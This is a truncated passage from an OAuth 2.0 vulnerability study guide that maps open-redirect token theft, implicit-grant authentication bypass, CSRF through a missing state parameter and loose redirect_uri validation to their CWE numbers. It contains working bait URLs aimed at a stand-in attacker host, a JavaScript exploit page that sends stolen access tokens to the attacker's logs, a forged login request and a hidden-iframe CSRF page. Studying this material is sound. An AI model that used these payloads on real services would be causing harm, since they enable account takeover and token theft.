# 📑 Deep-Dive Architectural Study: OAuth 2.0 Architectural & Implementation Flaws

**Module Group**: 02 — Client-Side Application Logic and Service Configurations  
**Severity Focus**: High to Critical (Potential for Full Account Takeover & Token Theft)

---

## 🔬 1. Client-Side Application Vulnerabilities

### Module 01: Token Exfiltration via Broken Whitelist Validation & Open Redirects
*   **CWE Mapping**: CWE-601 (Open Redirect), CWE-20 (Improper Input Validation)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
The vulnerability relies on a weak string-matching logic on the Authorization Server. Instead of validating the exact `redirect_uri` string, the server only checks if the incoming path **starts with** an allowed prefix. 

By design, during an OAuth **Implicit Grant Flow** (`response_type=token`), the authorization token is appended to the redirect URL inside a fragment identifier (`#access_token=...`). Unlike query parameters (`?`), when a browser processes an HTTP 302 redirect, it carries the URL hash fragment along across multiple redirection hops automatically. 

The attacker injects a path traversal payload (`/../`). The browser resolves this shortcut in memory *before* loading the page, canceling out the valid directory and dropping execution straight into a client-side open redirect parameter.

#### Typology A: Path Traversal Whitelist Bypass (`/../`)
*   **Allowed Path**: `https://vulnerable-client.com`
*   **Target Open Redirect Endpoint**: `https://vulnerable-client.com...`

#### 🎯 Raw Injection Payload
```text
/oauth-callback/../post/next?path=https://attacker-exploit.net
```

#### 🌐 Full Intercepted Bait URL (Sent to Victim)
```text
https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://vulnerable-client.com../post/next?path=https://attacker-exploit.net&response_type=token&nonce=1337&scope=openid%20profile%20email
```

#### Typology B: Parameter Confusion / Pollution
*   **Scenario**: The backend infrastructure parses duplicate query keys loosely, prioritizing the last occurrence.

#### 🎯 Raw Injection Payload
```text
&redirect_uri=https://attacker-exploit.net
```

#### 🌐 Full Intercepted Bait URL (Sent to Victim)
```text
https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://vulnerable-client.comcallback&redirect_uri=https://attacker-exploit.net&response_type=token&scope=openid
```

#### Attacker Infrastructure Script (`/exploit`)
This dual-action script runs on the exploit server. It handles two distinct page visits from the victim's browser using a conditional loop:

```html
<script>
if (!document.location.hash) {
    /* PHASE 1: First Visit (No Hash Present)
       The victim arrives clean. The script forcefully triggers the malicious 
       OAuth redirection chain using the Path Traversal bypass. */
    window.location = 'https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://vulnerable-client.com../post/next?path=https://attacker-exploit.net&response_type=token&nonce=1337&scope=openid%20profile%20email';
} else {
    /* PHASE 2: Return Visit (Hash Token Present)
       The victim bounces back from the client's open redirect with the token.
       The script strips the '#' and appends the token into a query string ('/?') 
       to drop it directly into the attacker's HTTP access logs. */
    window.location = '/?' + document.location.hash.substr(1);
}
</script>
```

#### 📄 Exfiltration Proof (The Attacker Access Log View)
```text
192.168.1.45 - - [19/Jun/2026:23:14:02 +0000] "GET /?access_token=eyJhbGciOiJSUzI1NiIsImtpZCI6...&expires_in=3600 HTTP/1.1" 200 404 "https://vulnerable-client.com"
```

---

### Module 02: Authentication Bypass via Improper Implicit Grant Implementation
*   **CWE Mapping**: CWE-287 (Improper Authentication), CWE-565 (Reliance on Public Info)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
When a classic client-server application implements the Implicit Flow for simplicity, it extracts user data via JavaScript on the frontend. To keep the user logged in, it submits this profile data to its backend via a POST request and receives a session cookie. 

The security boundary completely breaks here because the backend has no secrets or passwords to cross-examine. It implicitly trusts whatever data the browser self-reports, creating a direct impersonation vector.

#### 🌐 Intercepted Baseline Request (`POST /authenticate`)
```http
POST /authenticate HTTP/1.1
Host: vulnerable-client.com
Content-Type: application/json;charset=UTF-8

{
  "email": "wiener@normal-user.net",
  "username": "wiener",
  "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6..."
}
```

#### 🎯 Malicious Injection Payload (Modifying JSON Body)
Capture the request in Burp Suite and exchange the target identity strings:
```http
POST /authenticate HTTP/1.1
Host: vulnerable-client.com
Content-Type: application/json;charset=UTF-8

{
  "email": "carlos@dontwebauth.net",
  "username": "carlos",
  "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6..."
}
```

#### 📄 Demo Server Response (Successful Hijack)
```http
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=M0ckU3VyZVNlc3Npb25Db29raWU...; Secure; HttpOnly; SameSite=None
Content-Length: 0
Connection: close
```
*   **Result**: The server processes the request, fails to check if the attached token actually belongs to `carlos`, and returns a `302 Found` response assigning an authenticated session cookie belonging directly to the victim.

---

### Module 03: Flawed CSRF Protection (Missing or Weak `state`)
*   **CWE Mapping**: CWE-352 (Cross-Site Request Forgery)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
If an application allows users to link their social media profiles to an existing account but omits the unguessable cryptographically secure `state` parameter, the entire flow becomes vulnerable to CSRF. An attacker can tie their own social profile to a victim's account session.

#### 🎯 Exploit Delivery via Hidden Iframe (The CSRF Attack Structure)
Attackers host this payload on an external server and trick the logged-in victim into visiting it to force an account binding in the background:

```html
<!-- The victim views this harmless page while their browser executes the attack inside a hidden box -->
<h1>Loading Profile Assets... Please wait.</h1>

<iframe src="https://vulnerable-client.com?code=ATTACKER_VALID_AUTH_CODE" style="display:none;"></iframe>
```

#### 🌐 Full Intercepted Attack URL (Executed inside Iframe)
```text
https://vulnerable-client.com?code=7a5b3c2e1f9g8h7i6j5k
```

#### 📄 Demo Server Response (To the Victim's Browser)
```http
HTTP/1.1 302 Found
Location: /account-settings
Set-Cookie: notification=social_profile_linked_successfully; Path=/
Connection: close
```
*   **Result**: When the logged-in victim loads this HTML, their browser triggers the attacker's authorization code against the client backend. Because no unique session `state` token is cross-checked, the client backend binds the attacker's social media identity to the victim's profile account.

---

## 🔬 2. OAuth Service Provider Vulnerabilities

### Module 04: Account Hijacking via Loose `redirect_uri` Validation
*   **CWE Mapping**: CWE-20 (Improper Input Validation)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Unlike Module 01, this applies when the OAuth server performs zero path verification and accepts an attacker-controlled external domain as a legitimate callback target directly inside the initial handshake configuration.

#### 🎯 Raw Injection Payload
```text
redirect_uri=https://attacker-exploit.net
```

#### 🌐 Full Intercepted Bait URL (Direct Theft Link)
```text
https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://attacker-exploit.net&response_type=code&scope=openid
```

#### 📄 Demo Server Response (Redirecting Token Directly to Attacker)
```http
HTTP/1.1 302 Found
Location: https://attacker-exploit.net?code=v1kt1m_53cr37_c0d3_991
Connection: close
```
*   **Result**: The attacker hosts a link or sets an iframe to trigger this URL on the victim's browser. The OAuth provider generates an authorization code and sends it straight to the attacker's server callback logs without requiring any bugs on the client application site.

---

### Module 05: Flawed Scope Validation & Token Privilege Escalation
*   **CWE Mapping**: CWE-285 (Improper Authorization), CWE-915 (Improper Attribute Modification)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Typology A: Authorization Code Scope Upgrade
Occurs when an attacker registers an application with the OAuth service and requests a low-risk scope (e.g., `email`). Once the victim approves the consent screen, the attacker intercepts the code/token exchange request at the `/token` phase and appends unauthorized scopes.

#### 🎯 Raw Injection Payload
```text
